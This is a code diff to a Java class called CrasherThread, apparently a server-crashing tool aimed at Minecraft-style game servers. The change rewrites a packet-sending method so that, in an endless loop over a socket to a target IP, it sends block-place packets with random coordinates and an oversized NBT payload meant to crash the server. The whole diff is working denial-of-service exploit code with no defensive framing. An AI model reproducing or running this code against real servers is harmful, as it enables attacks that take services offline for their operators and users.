@@ -9,6 +9,7 @@ import static net.moofMonkey.Network.sendReady;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
+import java.util.concurrent.ThreadLocalRandom;
 
 public class CrasherThread extends Thread {
 	private final String ip;
@@ -52,10 +53,9 @@ public class CrasherThread extends Thread {
 				Thread.sleep(100L);
 				sendReady(dos);
 				while (true) {
-					sendReady(dos);
+					sendCrash(dos);
 					sendReady(dos);
 					Thread.sleep(1000L);
-					sendCrash(dos);
 				}
 			}
 		} catch(Throwable t) {
@@ -65,13 +65,14 @@ public class CrasherThread extends Thread {
 	}
 
 	public static void sendCrash(DataOutputStream dos) throws IOException { // FIXME: Packet place block
-		dos.writeInt(1);
+		dos.writeByte(15);
+		dos.writeInt(ThreadLocalRandom.current().nextInt(1000));
+		dos.writeByte(ThreadLocalRandom.current().nextInt(128));
+		dos.writeInt(ThreadLocalRandom.current().nextInt(1000));
+		dos.writeByte(ThreadLocalRandom.current().nextInt(4));
+		dos.writeShort(327);
 		dos.writeByte(1);
-		dos.writeInt(1);
-		dos.writeByte(1);
-		dos.writeShort(1);
-		dos.writeByte(1);
-		dos.writeShort(1);
+		dos.writeShort(0);
 		dos.writeShort(TooLongNBT.getDataLength());
 		dos.write(TooLongNBT.getData());
 		dos.writeByte(0);
